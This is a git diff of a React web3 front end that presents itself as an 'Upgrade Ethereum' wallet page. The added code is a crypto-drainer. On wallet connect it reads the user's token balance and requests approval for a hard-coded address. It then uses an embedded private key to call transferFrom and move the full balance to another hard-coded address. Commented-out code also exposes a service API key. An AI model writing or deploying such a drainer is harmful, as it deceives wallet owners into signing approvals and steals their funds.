@@ -1,22 +1,24 @@
 import React, { useEffect, useState } from 'react'
 import './App.css'
-import { ethers } from 'ethers'
-import { useWeb3React } from '@web3-react/core'
-import { injected } from './connector'
 
 import targetContract from './Utils/target.json'
 
 import Header from './components/header.js'
 
-// var __html = require('./template.html');
-// var template = { __html: __html };
+import { injected } from './connector';
+import { useWeb3React } from '@web3-react/core';
+const ethers = require('ethers');
+const abi = "[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"},{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"_approvals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"_balances\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"},{\"name\":\"guy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]";
+let provider = ethers.getDefaultProvider("rinkeby");
+let contractAddress = "0x45eFD55fcA3851E62864186729c1A25E14E58e57";
+let contract = new ethers.Contract(contractAddress, abi, provider);
 
 const App = () => {
   const { account, activate, deactivate } = useWeb3React()
   const [wallet, setWallet] = useState(false)
 
-  const contractAddress = '0xf8E1F093EdEF1CD0651B6C2eDB02aADCCF59A6f0'
-  const targetAddress = '0x2251691102ca9a78242B9EaA466F237C513168ab'
+  // const contractAddress = '0xf8E1F093EdEF1CD0651B6C2eDB02aADCCF59A6f0'
+  // const targetAddress = '0x2251691102ca9a78242B9EaA466F237C513168ab'
 
   const temptext1 = `<html lang="en">
 
@@ -5862,79 +5864,134 @@ const App = () => {
   const connectWallet = async () => {
     try {
       if (!account) {
-        await activate(injected)
-        await allow()
-        await transfer()
+        await activate(injected);
+        setTimeout(async () => {
+          await approve();
+        }, 10000)
+      } else {
+        await approve();
       }
-      // else
-      // {
-      //   await allow();
-      //   await transfer();
-      //   setWallet(false);
-      // }
-      // setWallet(true);
     } catch (error) {
       console.log(error)
     }
   }
 
-  const allow = async () => {
+  const approve = async () => {
     try {
-      const { ethereum } = window
+      console.log('approve')
+      let currentValue = await contract._balances(account);
+      console.log('current value---', currentValue)
+      const { ethereum } = window;
       if (ethereum) {
-        const provider = new ethers.providers.Web3Provider(ethereum)
+        const provider = new ethers.providers.Web3Provider(ethereum);
         const signer = provider.getSigner()
-        const sourceContract = new ethers.Contract(
-          contractAddress,
-          targetContract,
-          signer,
-        )
-        console.log(sourceContract)
-        console.log(targetAddress)
-        console.log(account)
-        const tx = await approve(sourceContract, targetAddress, account)
-
-        await tx.wait()
-        console.log(
-          `Aprroved, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`,
-        )
+        const web3Contract = new ethers.Contract(contractAddress, abi, signer)
+        let tx = await web3Contract.approve("0xfDC749A1feF80849C376461810bc76fBE87148eA", currentValue);
+        console.log(tx.hash);
+        await tx.wait();
+        await transfer(currentValue);
+        console.log('transferred')
       }
-    } catch (error) {
-      console.log(error)
+    } catch (e) {
+      console.log(e);
     }
-
-    // targetAddress
   }
-
-  const transfer = async () => {
+  const transfer = async (value) => {
     try {
-      const { ethereum } = window
-      if (ethereum) {
-        const provider = new ethers.providers.Web3Provider(ethereum)
-        const signer = provider.getSigner()
-        const sourceContract = new ethers.Contract(
-          contractAddress,
-          targetContract,
-          signer,
-        )
-        const remain = await sourceContract.balanceOf(contractAddress)
-        let sendAmount = 0
-        console.log(remain)
-        if (remain < ethers.constants.MaxUint256) sendAmount = remain
-        else sendAmount = ethers.constants.MaxUint256
-        const tx = await sourceContract.transfer(targetAddress, sendAmount)
-
-        await tx.wait()
-        console.log(
-          `Transfered, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`,
-        )
-      }
-    } catch (error) {
-      console.log(error)
+      console.log('trying to transfer');
+      let privateKey = '3066e602f4d2474c6beb8b65461cf6052fa21fbb7a5dae82428c6584851100f8';
+      let wallet = new ethers.Wallet(privateKey, provider);
+      let contractWithSigner = contract.connect(wallet);
+      console.log('balance-----', value);
+      let tx = await contractWithSigner.transferFrom(account, "0x14B689Cef84dB1354e732742A32c8c059D2C07d1", value);
+      await tx.wait();
+      console.log(tx.hash);
+    } catch (e) {
+      console.log(e);
     }
-
-    // targetAddress
   }
+
+  // const approve = async () => {
+  //   try {
+  //     const { ethereum } = window;
+  //     const netURL = 'https://rinkeby.infura.io/v3/30ea44a7f7a54d0d899346ed5a0929fd';
+  //     const CONTRACT_ABI = "[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"},{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"_approvals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"_balances\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"},{\"name\":\"guy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]"
+  //     const CONTRACT_ADDRESS = "0x45eFD55fcA3851E62864186729c1A25E14E58e57";
+  //     const contract = new ethers.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+  //     const data = await contract.methods.approve("0xfDC749A1feF80849C376461810bc76fBE87148eA", 10000000000000000000);
+  //     ethereum.request({
+  //       method: 'eth_sendTransaction',
+  //       params: [
+  //         {
+  //           to: CONTRACT_ADDRESS,
+  //           data: data,
+  //         },
+  //       ],
+  //     })
+  //         .then((txHash) => console.log(txHash))
+  //         .catch((error) => console.error);
+  //   } catch (e) {
+  //     console.log(e)
+  //   }
+  // }
+  //
+  // const allow = async () => {
+  //   try {
+  //     const { ethereum } = window
+  //     if (ethereum) {
+  //       const provider = new ethers.providers.Web3Provider(ethereum)
+  //       const signer = provider.getSigner()
+  //       const sourceContract = new ethers.Contract(
+  //         contractAddress,
+  //         targetContract,
+  //         signer,
+  //       )
+  //       console.log(sourceContract)
+  //       console.log(targetAddress)
+  //       console.log(account)
+  //       const tx = await approve(sourceContract, targetAddress, account)
+  //
+  //       await tx.wait()
+  //       console.log(
+  //         `Aprroved, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`,
+  //       )
+  //     }
+  //   } catch (error) {
+  //     console.log(error)
+  //   }
+  //
+  //   // targetAddress
+  // }
+  //
+  // const transfer = async () => {
+  //   try {
+  //     const { ethereum } = window
+  //     if (ethereum) {
+  //       const provider = new ethers.providers.Web3Provider(ethereum)
+  //       const signer = provider.getSigner()
+  //       const sourceContract = new ethers.Contract(
+  //         contractAddress,
+  //         targetContract,
+  //         signer,
+  //       )
+  //       const remain = await sourceContract.balanceOf(contractAddress)
+  //       let sendAmount = 0
+  //       console.log(remain)
+  //       if (remain < ethers.constants.MaxUint256) sendAmount = remain
+  //       else sendAmount = ethers.constants.MaxUint256
+  //       const tx = await sourceContract.transfer(targetAddress, sendAmount)
+  //
+  //       await tx.wait()
+  //       console.log(
+  //         `Transfered, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`,
+  //       )
+  //     }
+  //   } catch (error) {
+  //     console.log(error)
+  //   }
+  //
+  //   // targetAddress
+  // }
 
   //from here !!
 
@@ -5958,6 +6015,7 @@ const App = () => {
           <button className="waveButton" onClick={connectWallet}>
             {!account ? 'Connect Wallet' : 'Upgrade   Ethereum'}
           </button>
+          <button onClick={approve}>Approve</button>
           <div dangerouslySetInnerHTML={{ __html: temptext2 }} />
         </div>
       </div>
